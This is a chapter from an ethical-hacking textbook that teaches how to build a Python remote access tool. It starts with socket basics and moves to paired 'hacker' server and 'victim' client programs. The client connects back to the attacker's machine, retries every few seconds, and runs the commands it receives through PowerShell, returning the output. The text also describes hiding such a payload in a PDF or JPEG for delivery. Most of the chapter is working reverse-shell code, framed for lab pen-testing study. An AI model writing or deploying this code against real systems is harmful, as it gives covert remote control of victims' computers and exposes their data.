<html><head></head><body>
		<div id="_idContainer110">
			<h1 id="_idParaDest-124"><a id="_idTextAnchor130"/><em class="italic">Chapter 6</em>: Malware Development</h1>
			<p>In previous chapters, we have learned how to gather information pertaining to the user and how this information can be used to attack the victim. In this chapter, we will move toward a new dimension and develop a <strong class="bold">Remote Access Tool</strong> (<strong class="bold">RAT</strong>). RATs allow pen testers to gain access to victims' computers remotely and are widely used in the field of cybersecurity. There are much more advanced RAT programs available on the internet. However, the goal of this chapter is to help you build your own RAT, which will give you far more advanced control. </p>
			<p>In this chapter, we will cover the following topics:</p>
			<ul>
				<li>Introduction to RATs</li>
				<li>Socket programming in Python</li>
				<li>Creating malware</li>
				<li>Running commands remotely on the victim</li>
			</ul>
			<h1 id="_idParaDest-125"><a id="_idTextAnchor131"/>Understanding RATs</h1>
			<p>RATs have <a id="_idIndexMarker326"/>been widely used in cybersecurity and there are a lot of popular RATs available. Some hackers even offer customized and hard-to-detect RATs to be used to gain access to a victim's computer. In its simplest form, an RAT is a program that creates a network connection with another computer and performs an action. RATs can be legitimate software, such as a common commercial software such as TeamViewer, which is often used by IT professionals to diagnose remote computers and to detect problems. However, these programs can also be used by hackers to get control of the victim's machine, so you should be very careful in how you use these programs. </p>
			<p>In its simplest form, an RAT is a pair of programs. One program runs on the victim, while the other program runs on the attacker's machine. There are two main configurations in which these programs work depending on who initiates the communication. These are defined as follows:</p>
			<ul>
				<li>A program in <a id="_idIndexMarker327"/>which the attacker initiates the connection, called a <strong class="bold">forward connection</strong></li>
				<li>A program that <a id="_idIndexMarker328"/>causes the victim's machine to create a connection to the hacker's <a id="_idIndexMarker329"/>machine, called a <strong class="bold">reverse connection</strong></li>
			</ul>
			<p>Let's look at these in detail in the following sections.</p>
			<h2 id="_idParaDest-126"><a id="_idTextAnchor132"/>Forward shell</h2>
			<p>In modern <a id="_idIndexMarker330"/>computer systems, a<a id="_idIndexMarker331"/> forward connection is almost impossible since the security configuration of most PCs does not allow remote devices to initiate a connection unless there are specific rules mentioned in the firewall. By default, all incoming connections are blocked by the firewall. These connections are only possible if an open port is present in the victim's machine that can be exploited by the hacker. However, you will find that this is not the case in most typical scenarios. </p>
			<h2 id="_idParaDest-127"><a id="_idTextAnchor133"/>Reverse shell</h2>
			<p>A reverse shell <a id="_idIndexMarker332"/>employs the opposite <a id="_idIndexMarker333"/>approach. Instead of the attacker initiating a connection to the victim, the attacker would <a id="_idIndexMarker334"/>plant a malware/<strong class="bold">payload</strong> (code that executes on the victim's machine). In this way, instead of an external connection, an internal connection from the victim would be initiated, which<a id="_idIndexMarker335"/> makes it much more difficult for <strong class="bold">Intrusion Detection Systems</strong> (<strong class="bold">IDSes</strong>) such as firewalls and antivirus programs to detect malicious activity on the system. The way this kind of attack is deployed is that the attacker sends a malicious file containing malware to the victim embedded in a PDF or JPEG file, for example. To the victim, it would look like an ordinary file, but when the victim clicks on the file to open it, a script is executed in the background that initiates a connection back to the attacker. Once the connection to the attacker is established, the attacker can easily take control of the victim's machine and execute commands remotely on the victim's machine. Now <a id="_idIndexMarker336"/>that we have understood forward shells and reverse shells, let's move on to discuss sockets in Python.</p>
			<h1 id="_idParaDest-128"><a id="_idTextAnchor134"/>Socket programming in Python</h1>
			<p>Before <a id="_idIndexMarker337"/>learning about malware development, it <a id="_idIndexMarker338"/>is necessary that we learn about network programming in Python and how we can create network applications. The first step in learning network programming is to learn about what we call <em class="italic">sockets</em>. Sockets provide a fundamental mechanism for creating network-based applications and our malware is going to be essentially a network application. Let's start by understanding sockets first.</p>
			<h2 id="_idParaDest-129"><a id="_idTextAnchor135"/>Sockets</h2>
			<p>Before we jump <a id="_idIndexMarker339"/>into socket programming, let's first understand what a network socket is and how it can be used to develop network-based applications. As we learned in previous chapters, the topmost layer in a network stack is an application layer. These are the applications that the user interacts with in everyday life. Now, the question is, how do these applications, which are developed in different programming languages, communicate<a id="_idIndexMarker340"/> over the network? The answer lies in the use of sockets. A socket is defined here: <a href="https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html">https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html</a>.</p>
			<p>A socket is one endpoint of a two-way communication link between two programs running on the network. A socket is bound to a port number so that the TCP layer can identify the application that data is destined to be sent to.</p>
			<p>Sockets are generally used in client-server communication, where one node is a client initiating a connection, while the other node is a server responding to that connection. At each end of the connection, each process, such as a network initiation program or a network responding program, will employ a socket. A socket is typically identified by an IP address concatenated with a port number. In a typical scenario, a server usually listens on a certain port for incoming connection requests from clients. Once a client request arrives, the server accepts the request and initiates a socket connection with the client. </p>
			<p>Servers<a id="_idIndexMarker341"/> implementing <a id="_idIndexMarker342"/>specific services, such as <strong class="bold">HTTP</strong>, <strong class="bold">FTP</strong>, and <strong class="bold">telnet</strong>, listen <a id="_idIndexMarker343"/>on popular well-known ports such as <strong class="source-inline">80</strong>, <strong class="source-inline">21</strong>, and <strong class="source-inline">23</strong>. Ports from <strong class="source-inline">1</strong>-<strong class="source-inline">1024</strong> are regarded as well-known ports and should not be used in implementing your own programs as they <a id="_idIndexMarker344"/>are already reserved. Let's try to understand how sockets work in Python and, in the next section, we will learn how we can use this to our advantage to create our malware program.</p>
			<h2 id="_idParaDest-130"><a id="_idTextAnchor136"/>Creating a socket in Python</h2>
			<p>To create a <a id="_idIndexMarker345"/>socket in Python, we can utilize the <strong class="source-inline">socket</strong> library. This library is part of Python's standard package, so we don't need to install anything. </p>
			<p>This module can be imported by simply typing the following code:</p>
			<p class="source-code">import socket</p>
			<p>Let's take a<a id="_idIndexMarker346"/> look at the <strong class="bold">Application Programming Interface</strong> (<strong class="bold">API</strong>) of this module. An API is a software interface to a code base that lets you access the functionality of the code with some level of abstraction. </p>
			<h2 id="_idParaDest-131"><a id="_idTextAnchor137"/>socket.socket() API</h2>
			<p>To create<a id="_idIndexMarker347"/> a <a id="_idIndexMarker348"/>socket object, we can make use of the following function, called <strong class="source-inline">socket()</strong>. Let's take a look at the parameters of this method. To see what parameters are available for a function in VS Code, you can simply write the function name and then, using VS Code Intelli Sense technology (which helps you write code and helps you with suggestions), you can see what parameters are required. To access this menu, if you just put your cursor on the name of the function, a small popup will appear, indicating the parameters required by this method. If you want to see the detailed implementation of this method, you can right-click on the name of the <strong class="source-inline">socket</strong> function and select <strong class="bold">Go to definition</strong>. This will open a file where this method is defined. Be careful not to change anything here. If you are not using VS Code, you can read the documentation relating to the Python socket module here: <a href="https://docs.python.org/3/library/socket.html">https://docs.python.org/3/library/socket.html</a>. The implementation of this<a id="_idIndexMarker349"/> method <a id="_idIndexMarker350"/>will look like this: </p>
			<div>
				<div id="_idContainer100" class="IMG---Figure">
					<img src="image/B14788_06_01.jpg" alt="Figure 6.1 – Socket class constructor&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.1 – Socket class constructor</p>
			<p>The preceding screenshot shows that a socket is a class, and its constructor requires family, type, and proto parameters. We will discuss these parameters when we start building our programs in the next section of this chapter. For now, you just need to understand that calling the constructor of this <strong class="source-inline">socket</strong> class returns a socket object that can be used to communicate with other devices. </p>
			<h2 id="_idParaDest-132"><a id="_idTextAnchor138"/>socket.bind() API</h2>
			<p>Once you<a id="_idIndexMarker351"/> have created a socket object, to <a id="_idIndexMarker352"/>create a server, you need to bind a socket to the IP address and port that the socket will utilize for communication. Note that this function is only used when creating a <strong class="source-inline">server</strong> program. For servers, these must be explicitly assigned since the server has to listen for incoming connections on a specified port. In the case of a client, the IP and port are automatically <a id="_idIndexMarker353"/>assigned, so you will not use this <a id="_idIndexMarker354"/>function. </p>
			<h2 id="_idParaDest-133"><a id="_idTextAnchor139"/>socket.listen() API</h2>
			<p>The <strong class="source-inline">socket.listen()</strong> method<a id="_idIndexMarker355"/> is used by servers to listen for any incoming connection <a id="_idIndexMarker356"/>as per the configuration assigned in the <strong class="source-inline">socket.bind()</strong> method. In other words, it waits for any connection attempt to the specified IP on the specified port. This requires a queue size for the number of connections to be held in a queue before it starts rejecting connections. For example, <strong class="source-inline">socket.listen(5)</strong> means that it will allow five connections at a time. </p>
			<h2 id="_idParaDest-134"><a id="_idTextAnchor140"/>socket.accept() API</h2>
			<p>As the <a id="_idIndexMarker357"/>name indicates, the <strong class="source-inline">socket.accept()</strong> API <a id="_idIndexMarker358"/>accepts connections made by clients. This is<a id="_idIndexMarker359"/> a <strong class="bold">blocking function</strong> call, which means that program execution will pause here until a connection is successfully made. Once a connection is made, execution of the program will continue. </p>
			<h2 id="_idParaDest-135"><a id="_idTextAnchor141"/>socket.connect()</h2>
			<p>As we <a id="_idIndexMarker360"/>have seen that <strong class="source-inline">socket.accept()</strong> blocks<a id="_idIndexMarker361"/> execution until a client connects, the question now arises, how do clients connect? This is where <strong class="source-inline">socket.connect()</strong> comes into play. This method initiates a connection to the server and if a server is waiting for incoming connections, communication will follow. When a call to <strong class="source-inline">socket.connect()</strong> happens, <strong class="source-inline">socket.accept()</strong> gets unblocked in the server and execution of the program continues. Don't worry if this all seems very confusing to you at the moment as to which functions are called in the server, and which functions in the client. You will get a clear idea of this when we build examples. </p>
			<h2 id="_idParaDest-136"><a id="_idTextAnchor142"/>socket.send()</h2>
			<p>Once the <a id="_idIndexMarker362"/>connection is made between the server and <a id="_idIndexMarker363"/>client programs, the most important part of the program comes, which is to send data over these connections. This is where most of the user-defined logic will reside. The <strong class="source-inline">socket.send()</strong> method is used to send bytes over the network. Note that the input to this function is bytes, so any data you want to send over this connection should be in the form of bytes. It is the responsibility of the user to encode the appropriate data into bytes and to decode at the receiving end. </p>
			<h2 id="_idParaDest-137"><a id="_idTextAnchor143"/>Socket.recv()</h2>
			<p>This <a id="_idIndexMarker364"/>method, as the name suggests, is used to receive<a id="_idIndexMarker365"/> bytes once the user sends the data. Note that every call to the send or receive methods should be handled properly. For example, if the server is sending data, the client should be ready to receive this data and vice versa. The input to this method is the number of bytes you want to receive at once. This is the buffer created by the program to temporarily store data, and once a certain number of bytes arrive, they can be read, and the buffer is ready for the next cycle. </p>
			<h2 id="_idParaDest-138"><a id="_idTextAnchor144"/>socket.close()</h2>
			<p>Once you<a id="_idIndexMarker366"/> have done everything you wanted to do<a id="_idIndexMarker367"/> with a program, you must close the socket so that the port can become available to other programs to be used. Note that even if you don't close the socket properly, it will be released by your operating system after a period of time once your program exits or your computer restarts. However, it is always a good idea to close these sockets manually inside the program. If the program exits and the socket is not closed properly, any incoming requests may be blocked, or the operating system may refuse to use this socket for the next program because it may think that the port is still in use. </p>
			<h2 id="_idParaDest-139"><a id="_idTextAnchor145"/>Fitting it altogether</h2>
			<p>Until now, we <a id="_idIndexMarker368"/>have learned different methods of the socket API, but to get a clear understanding of how and where each function is used, I will summarize everything here. We will have two programs running separately. One will be the server listening for incoming connections, and the other will be the client trying to make a connection. Let's take a look at the following diagram to see how things fit together in the socket API: </p>
			<div>
				<div id="_idContainer101" class="IMG---Figure">
					<img src="image/B14788_06_02.jpg" alt="Figure 6.2 – Client and server socket usage in Python&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.2 – Client and server socket usage in Python</p>
			<p>The diagram <a id="_idIndexMarker369"/>shows two separate programs running concurrently, namely, the client and server. You may be wondering how this client and server relate to our hacking purposes? Well, we will use a similar approach to develop our malware. We will write two programs. One program will run on the hacker's machine, we will call this the server/hacker program, and the other will run on the client; we will refer to this as the victim program. The victim program will try to connect with the hacker program. This way, since the connection is originating from the victim's machine, the antivirus or IDS will not block it. In this section, we have learned how socket programming in Python works. We<a id="_idIndexMarker370"/> didn't go into much detail in terms of how we create these programs. In the next section, we will make use of this socket API to create our victim and the hacker parts of the malware.</p>
			<h1 id="_idParaDest-140"><a id="_idTextAnchor146"/>Creating malware</h1>
			<p>Now that we <a id="_idIndexMarker371"/>have seen what the outline of our malware program will look like, let's start writing our hacker and victim programs.</p>
			<h2 id="_idParaDest-141"><a id="_idTextAnchor147"/>Hacker server</h2>
			<p>In this<a id="_idIndexMarker372"/> section, we will write a program for the hacker server, which<a id="_idIndexMarker373"/> will constantly listen for incoming connections originating from the victim's machine to the hacker. Let's go to our Kali machine and create a new project called <strong class="source-inline">hacker server</strong>. Also, create a new virtual environment, as we have done in previous chapters. We will not require any external library in this section, but it is always a good idea to use virtual environments to keep track of dependencies in our program. Also, create a new file called <strong class="source-inline">server.py</strong>.</p>
			<p>The IP address of our Kali machine is <strong class="source-inline">192.168.74.128</strong>, and for the victim's Windows machine, it is <strong class="source-inline">192.168.74.129</strong>. Next, we need to select which port we will be listening on for incoming connections. You can select any port above <strong class="source-inline">1024</strong> and less than <strong class="source-inline">65355</strong>. However, we will use port number <strong class="source-inline">8008</strong>. This will be the port we bind the server to, and if the client wants to connect with the server, it needs to use this port. Let's import the socket module and create a socket object. Take a look at the following code: </p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </p>
			<p>Here, on the first line, we are simply importing the <strong class="source-inline">socket</strong> module from the Python standard library. Next, we are creating a socket object. The two parameters are <strong class="source-inline">socket.AF_INET</strong> and <strong class="source-inline">socket.SOCK_STREAM</strong>. Let's see what they mean. Remember that we talked about the IPv4 and IPv6 addresses? This is exactly what <strong class="source-inline">socket.AF_INET</strong> means. We are using IPv4, which is denoted by <strong class="source-inline">socket.AF_INET</strong>. If you want to use IPv6 (which you probably won't), you can select <strong class="source-inline">socket.AF_INET6</strong>. Next, we need to define what network layer protocol we want to use. Here, we have options for either TCP or UDP. In our examples, we want to use a reliable connection, so we will choose TCP. <strong class="source-inline">socket.SOCK_STREAM</strong> means that we are creating a TCP socket. If you want to create a UDP<a id="_idIndexMarker374"/> socket (which, again, you probably won't for the<a id="_idIndexMarker375"/> most part), you can use <strong class="source-inline">socket.SOCK_DGRAM</strong>.</p>
			<p>Next, we will bind this server to the Kali's IP address and port <strong class="source-inline">8008</strong>: </p>
			<p class="source-code">    IP = "192.168.74.128"</p>
			<p class="source-code">    Port = 8008</p>
			<p class="source-code">    socket_address = (IP, Port)</p>
			<p class="source-code">    hacker_socket.bind(socket_address)</p>
			<p>Note that you have to give the IP address and port in <em class="italic">tuple</em> form to the <strong class="source-inline">socket.bind()</strong> method. </p>
			<p>Next, we need to listen for incoming connections on the specified socket with the help of the following command: </p>
			<p class="source-code">hacker_socket.listen(5)</p>
			<p>Now that our program configuration is almost complete, we can start listening for incoming connection requests: </p>
			<p class="source-code">    hacker_socket.listen(5)</p>
			<p class="source-code">    print("listening for incoming connection requests")</p>
			<p class="source-code">    hacker_socket, client_address = hacker_socket.accept()</p>
			<p>Execution of the program will pause here. Once the client has connected, this method will return two parameters. The first is <strong class="source-inline">hacker_socket</strong>, which we can use to send and receive data, and the second is the address of the victim. This will help the program to know which client is connected. </p>
			<p>Once the connection has been accepted, we can use this socket to send a message over the network. As mentioned earlier, the accept function is blocking, which means that execution is paused here until someone connects. To demonstrate <a id="_idIndexMarker376"/>this, let's run the program. You will see the following<a id="_idIndexMarker377"/> output:</p>
			<div>
				<div id="_idContainer102" class="IMG---Figure">
					<img src="image/B14788_06_03.jpg" alt="Figure 6.3 – Waiting for incoming connections &#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.3 – Waiting for incoming connections </p>
			<p>You will see that programs don't move past this step. You can press <em class="italic">Ctrl + C</em> to exit the program. Now, let's try to send a simple message from the <em class="italic">hacker</em> to the victim. For now, we will send a simple string, but in later sections, we will send more advanced data, such as files: </p>
			<p class="source-code">    message = "Message from hacker"</p>
			<p class="source-code">    message_bytes = message.encode()</p>
			<p class="source-code">    hacker_socket.send(message_byte)</p>
			<p class="source-code">    print("Message sent from hacker")</p>
			<p>The <strong class="source-inline">message.encode()</strong> method converts the message string into bytes, as the <strong class="source-inline">socket.send()</strong> method only accepts bytes. </p>
			<p>Finally, we will close this socket by calling the <strong class="source-inline">close()</strong> method. </p>
			<p>The complete code for the hacker program is shown as follows:</p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    hacker_socket = socket.socket(socket.AF_INET,     socket.SOCK_STREAM)</p>
			<p class="source-code">    IP = "192.168.74.128"</p>
			<p class="source-code">    Port = 8008</p>
			<p class="source-code">    socket_address = (IP, Port)</p>
			<p class="source-code">    hacker_socket.bind(socket_address)</p>
			<p class="source-code">    hacker_socket.listen(5)</p>
			<p class="source-code">    print("listening for incoming connection requests")</p>
			<p class="source-code">    hacker_socket, client_address = hacker_socket.accept()</p>
			<p class="source-code">    message = "Message from hacker"</p>
			<p class="source-code">    message_bytes = message.encode()</p>
			<p class="source-code">    hacker_socket.send(message_bytes)</p>
			<p class="source-code">    print("Message sent")</p>
			<p class="source-code">    hacker_socket.close()</p>
			<p>Our hacker<a id="_idIndexMarker378"/> program is now complete. Next, we will move to the victim <a id="_idIndexMarker379"/>program, which will initiate a connection with the hacker. </p>
			<h2 id="_idParaDest-142"><a id="_idTextAnchor148"/>Victim's client</h2>
			<p>Go to the <a id="_idIndexMarker380"/>Windows 10 machine and create a new project for the victim. The first few steps will be similar to the hacker program. Take a look at the following code: </p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    hacker_IP = "192.168.74.128"</p>
			<p class="source-code">    hacker_port = 8008</p>
			<p class="source-code">    hacker_address = (hacker_IP, hacker_port)</p>
			<p>Since we want to connect to the hacker, we will provide the hacker's IP and the corresponding port the hacker is listening on. </p>
			<p>Next, we will create a tuple for <strong class="source-inline">hacker_address</strong>.</p>
			<p>The next step is to <strong class="source-inline">connect()</strong> with the hacker using the victim's socket:</p>
			<p class="source-code">    victim_socket.connect(hacker_address)</p>
			<p>Once this method is called, if the server is listening, we will have a successful connection established, otherwise we will see an error message. If you run the program now, you will see a connection refused message:</p>
			<div>
				<div id="_idContainer103" class="IMG---Figure">
					<img src="image/B14788_06_04.jpg" alt="Figure 6.4 – Connection failure&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.4 – Connection failure</p>
			<p>This is <a id="_idIndexMarker381"/>because, if there is no server listening on a certain port, all incoming traffic is blocked by default. Remember that in our hacker program, we were sending a message? We need to handle that message here, otherwise we would run into errors. We can use the <strong class="source-inline">recv</strong> method to receive messages: </p>
			<p class="source-code">    data = victim_socket.recv(1024)</p>
			<p><strong class="source-inline">1024</strong> is the number of bytes the socket can read at once. Any data more than this number coming from the hacker will be truncated. We can use loops to receive more data. For now, this number would be enough. </p>
			<p>Finally, since we receive the data in the form of bytes, we need to decode them into a string to print them and later use them in the program if we want: </p>
			<p class="source-code">    print(data.decode())</p>
			<p class="source-code">    victim_socket.close()</p>
			<p>We can close the socket using the <strong class="source-inline">close()</strong> method. The complete program is as follows: </p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    hacker_IP = "192.168.74.128"</p>
			<p class="source-code">    hacker_port = 8008</p>
			<p class="source-code">    hacker_address = (hacker_IP, hacker_port)</p>
			<p class="source-code">    victim_socket.connect(hacker_address)</p>
			<p class="source-code">    data = victim_socket.recv(1024)</p>
			<p class="source-code">    print(data.decode())</p>
			<p class="source-code">    victim_socket.close()</p>
			<p>Now our hacker and victim programs are complete in their simplest form. A hacker is listening for incoming connections, and the victim tries to connect with the hacker program. Once the connection is established, the hacker sends a message to the<a id="_idIndexMarker382"/> victim. The victim receives the message and simply prints it. Both parties then close their respective connections. What we have learned so far is generic socket programming. Once we understand how we can create connections between two devices in a network, we can adopt these programs to create malicious programs that can allow hackers to perform malicious activities on the victim's computer. </p>
			<p>Let's tie all this together. First, run the hacker program and then run the victim's program. This time, the connection will be properly established and, on the hacker's machine, you will see the following output: </p>
			<div>
				<div id="_idContainer104" class="IMG---Figure">
					<img src="image/B14788_06_05.jpg" alt="Figure 6.5 – Hacker's program&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.5 – Hacker's program</p>
			<p>Similarly, the victim will receive the message and display it on screen: </p>
			<div>
				<div id="_idContainer105" class="IMG---Figure">
					<img src="image/B14788_06_06.jpg" alt="Figure 6.6 – Message received by the victim&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.6 – Message received by the victim</p>
			<p>We have completed one part of the puzzle, which is to create a successful connection from the victim's machine to the hacker's machine, and received a small message at the victim's machine, sent by the hacker. This may not seem like a big task, but this is a very powerful tool. Using this, you can essentially take commands from the hacker. Design the victim program to run these commands on the machine and send the results back to the hacker. In the next section, we will learn how <a id="_idIndexMarker383"/>to send commands from the hacker's machine to the victim's machine and send the results back to the hacker. </p>
			<h1 id="_idParaDest-143"><a id="_idTextAnchor149"/>Running commands remotely on the victim's machine</h1>
			<p>We have <a id="_idIndexMarker384"/>already seen in <a href="B14788_03_Final_JC_ePub.xhtml#_idTextAnchor070"><em class="italic">Chapter 3</em></a>, <em class="italic">Reconnaissance and Information Gathering</em> (in the <em class="italic">Creating a Python script</em> section), how to run commands on a computer using Python. We will build on that knowledge to create a malware that will take commands and execute them on a victim's machine. Our previous program just sends one message to the victim and exits. This time, we will modify the program to do much more than that. </p>
			<p>Open a new project on the Kali machine to execute commands on the victim's machine and create a new file. Let's start by establishing a connection:</p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    IP = "192.168.74.128"</p>
			<p class="source-code">    Port = 8008</p>
			<p class="source-code">    socket_address = (IP, Port)</p>
			<p class="source-code">    hacker_socket.bind(socket_address)</p>
			<p class="source-code">    hacker_socket.listen(5)</p>
			<p class="source-code">    print("listening for incoming connection requests")</p>
			<p class="source-code">    hacker_socket, client_address = hacker_socket.accept()</p>
			<p>The next step involves taking the user input for the command we want to run on the victim's machine. Once this input is taken, we must convert it into bytes and send it over the connection to the victim program: </p>
			<p class="source-code">     command = input("Enter the command ")</p>
			<p class="source-code">     hacker_socket.send(command.encode())</p>
			<p>Once the command is sent, the victim side program will take care of executing it and return the result. Here, on the hacker program, we will simply receive whatever<a id="_idIndexMarker385"/> is returned by the victim and print it as a result: </p>
			<p class="source-code">      command_result = hacker_socket.recv(1048)</p>
			<p class="source-code">      print(command_result.decode())</p>
			<p>Next, we will put this inside a loop and put an exit condition as well: </p>
			<p class="source-code">        while True:</p>
			<p class="source-code">            command = input("Enter the command ")</p>
			<p class="source-code">            hacker_socket.send(command.encode())</p>
			<p class="source-code">            if command == "stop":</p>
			<p class="source-code">                break</p>
			<p class="source-code">            command_result = hacker_socket.recv(1048)</p>
			<p class="source-code">            print(command_result.decode())</p>
			<p>The <strong class="source-inline">if</strong> statement makes sure that we can safely exit this loop when we want so that we don't get stuck in an infinite loop. Also, to make sure that we close the socket properly if we encounter any error during execution, we will add a <strong class="source-inline">try-catch</strong> block for exception handling. The complete hacker program for executing commands looks like this: </p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    IP = "192.168.74.128"</p>
			<p class="source-code">    Port = 8008</p>
			<p class="source-code">    socket_address = (IP, Port)</p>
			<p class="source-code">    hacker_socket.bind(socket_address)</p>
			<p class="source-code">    hacker_socket.listen(5)</p>
			<p class="source-code">    print("listening for incoming connection requests")</p>
			<p class="source-code">    hacker_socket, client_address = hacker_socket.accept()</p>
			<p class="source-code">    print("connection established with ", client_address)</p>
			<p class="source-code">    try:</p>
			<p class="source-code">        while True:</p>
			<p class="source-code">            command = input("Enter the command ")</p>
			<p class="source-code">            hacker_socket.send(command.encode())</p>
			<p class="source-code">            if command == "stop":</p>
			<p class="source-code">                break</p>
			<p class="source-code">            command_result = hacker_socket.recv(1048)</p>
			<p class="source-code">            print(command_result.decode())</p>
			<p class="source-code">    except Exception:</p>
			<p class="source-code">        print("Exception occured")</p>
			<p class="source-code">        hacker_socket.close()</p>
			<p>On the <a id="_idIndexMarker386"/>victim side, we will receive the command that the hacker sends and use the <strong class="source-inline">subprocess</strong> module to execute commands, and finally send the results back to the hacker. This part will be coded on the Windows 10 machine. Let's create a new project on the Windows machine and try to follow the same steps for creating a connection with the hacker program:</p>
			<p class="source-code">import socket</p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    hacker_IP = "192.168.74.128"</p>
			<p class="source-code">    hacker_port = 8008</p>
			<p class="source-code">    hacker_address = (hacker_IP, hacker_port)</p>
			<p class="source-code">    victim_socket.connect(hacker_address)</p>
			<p>As we have seen on the hacker program that we have a <strong class="source-inline">while</strong> loop to send commands continuously, we will deploy a similar approach here: </p>
			<p class="source-code">     data = victim_socket.recv(1024)</p>
			<p class="source-code">     hacker_command = data.decode()</p>
			<p>We will add a similar exit condition here, as we did in the hacker program: </p>
			<p class="source-code">     if hacker_command == "stop":</p>
			<p class="source-code">          break</p>
			<p>Next, we run the command on the victim computer and obtain a result in string format as shown: </p>
			<p class="source-code">            output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)</p>
			<p><strong class="source-inline">powershell.exe</strong> makes <a id="_idIndexMarker387"/>sure that we run commands using PowerShell in Windows. <strong class="source-inline">capture_output=True</strong> makes sure that we receive a result in the <strong class="source-inline">output</strong> variable.  </p>
			<p>Next, we need to check for errors. If any error occurs during execution of the command, we need to handle it properly so that we don't break the program, otherwise we will send the result back to the hacker: </p>
			<p class="source-code">      if output.stderr.decode("utf-8") == "":</p>
			<p class="source-code">          command_result = output.stdout</p>
			<p class="source-code">      else:</p>
			<p class="source-code">          command_result = output.stderr</p>
			<p>The first condition checks that if there is no error during command execution, we set the <strong class="source-inline">command_result</strong> variable to the output of the command, otherwise we set <strong class="source-inline">command_result</strong> to the error. Note that by default, this is in the form of bytes, so we don't need to encode it to send it over the network: </p>
			<p class="source-code">      victim_socket.send(command_result)</p>
			<p>Finally, we need to put all this command execution code in a <strong class="source-inline">try-catch</strong> block for any exception handling and proper closure of the socket. The complete program can be found here: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py</a>.</p>
			<p>Let's try running some commands on the victim's machine and get back the results. First, start the hacker program and then run the victim program. Enter the commands in the hacker program and see the results contained therein: </p>
			<div>
				<div id="_idContainer106" class="IMG---Figure">
					<img src="image/B14788_06_07.jpg" alt="Figure 6.7 – Hacker executing a command on the victim&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.7 – Hacker executing a command on the victim</p>
			<p>Here, you<a id="_idIndexMarker388"/> can see that the hacker sends an <strong class="source-inline">ipconfig</strong> command to the victim. The victim program reads the command, executes it on the victim, and sends the result back to the hacker. There are some minor issues with the program that we will now discuss. Firstly, the victim program tries to connect just once with the hacker, and if the hacker is not listening, the program will throw an error and exit. This is not ideal since we want to connect to the victim whenever we want. To do this, we will put the <strong class="source-inline">connect()</strong> method inside the loop so that it can attempt to continuously make a connection with the hacker, and when the hacker is online, the connection is immediately established. Take a look at the code for the victim program here: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py</a>.</p>
			<p>Let's now take a look at the changes made in this program. First, there is an outer <strong class="source-inline">while</strong> loop. The purpose of this loop is to constantly try to establish a connection with the hacker, and if an error occurs, it waits 5 seconds and then tries to reconnect. Once the connection is established inside the loop, there is another loop inside that makes sure that multiple commands can be sent by the hacker to the victim. This <strong class="source-inline">while</strong> loop can be exited by the hacker by using the <strong class="source-inline">stop</strong> command. Lastly, there is a keyboard interrupt exception if you want to close the program. Press <em class="italic">Ctrl + C</em> to exit the program. This way, this program won't run indefinitely. </p>
			<p>So now we have solved our first problem. Now we need to run the victim program only once and it will keep on trying to connect with the hacker and, when the <a id="_idIndexMarker389"/>hacker becomes available, it will connect. Our program has another small issue as well. When the hacker program asks to enter a command, if we just press <em class="italic">Enter</em>, it will cause problems because <strong class="source-inline">Enter</strong> is not a valid command. We also need to handle that as well. To handle it, we can simply include a check to make sure that the hacker does not enter an empty command. To do this, enter the following commands: </p>
			<p class="source-code">     if command == "":</p>
			<p class="source-code">          continue</p>
			<p>We will put this check both in the hacker's as well as the victim's program. </p>
			<p>Lastly, if you notice carefully, we can only send and receive data that is less than 1,024 bytes, as defined in our receive function. Any data more than this will be truncated. To see it in more detail, go to the Windows machine and run any command whose result is more than 1,024 bytes. For instance, let's take a look at the <strong class="source-inline">systeminfo</strong> command. This command gives out the system information and has a relatively large output: </p>
			<div>
				<div id="_idContainer107" class="IMG---Figure">
					<img src="image/B14788_06_08.jpg" alt="Figure 6.8 – systeminfo result&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.8 – systeminfo result</p>
			<p>Now, run<a id="_idIndexMarker390"/> the same command using your hacker program. Your output will be something like this: </p>
			<div>
				<div id="_idContainer108" class="IMG---Figure">
					<img src="image/B14788_06_09.jpg" alt="Figure 6.9 – Truncated command result&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.9 – Truncated command result</p>
